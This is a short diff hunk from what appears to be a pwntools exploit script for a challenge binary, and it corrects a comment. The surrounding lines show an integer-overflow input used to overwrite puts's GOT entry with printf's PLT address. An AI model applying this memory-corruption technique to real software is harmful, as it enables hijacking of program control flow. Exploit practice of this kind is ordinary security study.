@@ -46,7 +46,7 @@ elif args.debug:
 else:
     p = process()
 
-# Overwriting puts got with printf's plt using an int overflow
+# Overwriting puts's got with printf's plt using an int overflow
 p.recvuntil(b">")
 add(b"-10", b"\xf0")
 
